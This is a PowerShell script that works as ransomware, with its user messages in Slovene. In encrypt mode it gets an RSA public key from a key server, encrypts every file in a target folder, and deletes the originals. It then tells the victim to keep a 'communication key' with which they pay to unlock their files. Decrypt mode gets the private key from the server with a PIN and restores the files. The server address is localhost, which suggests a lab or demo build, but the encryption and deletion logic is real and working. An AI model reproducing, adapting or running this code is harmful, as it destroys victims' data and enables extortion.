param (
    [string]$Mode,
    [string]$KeyPath,
    [string]$FilesPath,
    [string]$Pin
)

function Save-SerialKey($filesPath, $hash) {
    $serialkeyContent = @{
        FilesPath = $filesPath
        CommunicationHash = $hash
    } | ConvertTo-Json
    Set-Content -Path "$PSScriptRoot\serialkey" -Value $serialkeyContent
}

function Load-SerialKey($path) {
    if (!(Test-Path $path)) {
        exit 1
    }
    $content = Get-Content $path -Raw | ConvertFrom-Json
    return $content
}

function Encrypt-Files($filesPath, $publicKeyXml) {
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
    $rsa.PersistKeyInCsp = $false
    $rsa.FromXmlString($publicKeyXml)
    $sourceDir = $filesPath

    Get-ChildItem $sourceDir -File | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $chunkSize = 190
        $encrypted = New-Object System.Collections.Generic.List[byte]
        for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
            $block = $bytes[$i..([Math]::Min($i + $chunkSize - 1, $bytes.Length - 1))]
            $enc = $rsa.Encrypt($block, $false)
            $encrypted.AddRange($enc)
        }
        [System.IO.File]::WriteAllBytes("$sourceDir\$($_.Name).e", $encrypted.ToArray())
        Remove-Item $_.FullName
    }
}

function Decrypt-Files($privateKeyXml, $filesPath) {
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider 2048
    $rsa.PersistKeyInCsp = $false
    $rsa.FromXmlString($privateKeyXml)
    $sourceDir = $filesPath
    
    cls
    Get-ChildItem $sourceDir -Filter *.e | ForEach-Object {
        $output = "$sourceDir\$($_.BaseName)"
        Write-Host "Odklepanje $output"
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $chunkSize = 256
        $decrypted = New-Object System.Collections.Generic.List[byte]
        for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
            $block = $bytes[$i..($i + $chunkSize - 1)]
            try {
                $plain = $rsa.Decrypt($block, $false)
                $decrypted.AddRange($plain)
            } catch {
                continue
            }
        }
        [System.IO.File]::WriteAllBytes($output, $decrypted.ToArray())
        Write-Host "Odklenjeno: $output"
        Remove-Item $_.FullName
    }
}

function Register-Key {
    try {
        $response = Invoke-RestMethod -Uri "http://localhost:4040/register" -Method Get -TimeoutSec 10
    } catch {
        Write-Host "Napaka. Strežnik ni dostopen: http://localhost:4040/register"
        exit 10
    }
    $publicKeyXml = $response.keyXml
    $hash = $response.communicationKey
    $generatedAt = $response.generatedAt
    return @{ publicKeyXml = $publicKeyXml; hash = $hash; generatedAt = $generatedAt }
}

function Get-PrivateKey($hash, $pin) {
    try {
        $response = Invoke-RestMethod -Uri "http://localhost:4040/private?identifier=$hash&key=$pin" -Method Get -TimeoutSec 10
    } catch {
        Write-Host "Napaka. Strežnik ni dostopen: http://localhost:4040/private"
        exit 11
    }
    if ($response -match "<RSAKeyValue>") {
        return $response
    }
    return $response
}

switch ($Mode.ToLower()) {
    "encrypt" {
        if (!$FilesPath) { exit 2 }
        $reg = Register-Key
        $publicKeyXml = $reg.publicKeyXml
        $hash = $reg.hash
        Encrypt-Files $FilesPath $publicKeyXml
        Save-SerialKey $FilesPath $reg.hash
        Write-Host "Kljuc za komunikacijo: $hash"
        Write-Host "Kljuc shranite, saj z njim placate dostop do vasih zaklenjenih datotek!"
        exit 0
    }
    "decrypt" {
        $serial = Load-SerialKey "$PSScriptRoot\serialkey"
        $hash = $serial.CommunicationHash
        if (-not $Pin) {
            Write-Host "Pin ni bil vnešen!"
            exit 2
        }
        try {
            $privateKeyXml = Get-PrivateKey $hash $Pin
            if ($privateKeyXml -is [System.Xml.XmlDocument]) {
                $privateKeyXmlString = $privateKeyXml.OuterXml
            } else {
                $privateKeyXmlString = [string]$privateKeyXml
            }
            if ($privateKeyXmlString -notmatch "<RSAKeyValue>") {
                Write-Host "Odziv streznika: $privateKeyXmlString"
            } else {
                Write-Host "Odklepanje datotek... (Lahko traja dlje casa...)"
            }
            $filesPath = $serial.FilesPath
            Decrypt-Files $privateKeyXmlString $filesPath
            Remove-Item "$PSScriptRoot\serialkey"
            Write-Host "Datoteke odklenjene!"
            exit 0
        } catch {
            Write-Host "Napaka med odklepanjem."
            exit 4
        }
    }
    default {
        exit 1
    }
}
